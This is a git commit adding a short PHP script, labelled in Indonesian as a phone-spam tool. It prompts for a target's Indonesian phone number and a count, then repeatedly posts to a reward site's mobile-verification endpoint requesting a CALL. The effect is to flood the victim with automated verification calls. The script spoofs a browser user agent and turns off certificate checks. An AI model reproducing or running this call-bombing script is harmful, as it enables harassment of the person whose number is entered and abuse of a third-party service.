1d749c54c9482332970df7244e3816eca4b81ceb
ifqygazhar <ifqygazhar@gmail.com>
2022-05-11 07:16:51 +0700

    spam telfon php

---
+++ spamtelp/App.php
@@ -0,0 +1,33 @@
+<?php
+
+echo "contoh nomor : 851xxxx" . PHP_EOL;
+echo "jangan masukan nomor awalan memakai +62 atau 0" . PHP_EOL;
+echo "masukan nomor : ";
+$target = trim(fgets(STDIN));
+echo "masukan jumlah spam : ";
+$jm = trim(fgets(STDIN));
+
+$data = <<<DATA
+{
+    "method": "CALL",
+    "countryCode": "id"
+}
+DATA;
+
+
+for ($i = 0; $i < $jm; $i++){
+    echo "waiting api nya agak sedikit lemot...." . PHP_EOL;
+    $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,"https://id.jagreward.com/member/verify-mobile/$target");
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,$data );
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+
+        $server_output = curl_exec ($ch);
+        curl_close ($ch);
+        echo "sukses"."\n";
+}
